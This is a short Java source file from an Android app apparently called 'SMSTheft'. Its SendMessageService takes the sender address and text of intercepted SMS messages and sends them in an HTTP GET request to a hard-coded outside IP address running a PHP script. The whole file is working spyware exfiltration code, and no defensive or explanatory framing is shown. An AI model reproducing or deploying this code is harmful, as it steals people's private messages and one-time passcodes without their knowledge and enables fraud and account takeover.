package me.lightless.smstheft;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;

import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

/**
 * Created by lightless on 2014/11/15.
 */
public class SendMessageService extends IntentService {

    private static final String TAG = "SMSTheft";

    public SendMessageService() {
        super("SendMessageService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Log.d(TAG,"[DEBUG]onHandleIntent called.");
        // http://107.189.158.11/ls/23kaso23.php?address=123&content=abc
        // String temp = intent.getStringExtra("smsString");
        // Log.d(TAG, "smsString" + temp);
        // String [] data = temp.split("");
        String address = intent.getStringExtra("address");
        String content = intent.getStringExtra("content");

        Log.d(TAG, "[DEBUG]address: " + address);
        Log.d(TAG, "[DEBUG]content: " + content);

        // send message
        try {
            HttpClient httpClient = new DefaultHttpClient();
            String url = "http://107.189.158.11/ls/23kaso23.php?address=" + address
                    + "&content=" + content;
            HttpGet httpGet = new HttpGet(url);
            httpClient.execute(httpGet);
        } catch (Exception e) {
            e.printStackTrace();
        }
        Log.d(TAG, "[DEBUG] Send done.");

    }
}
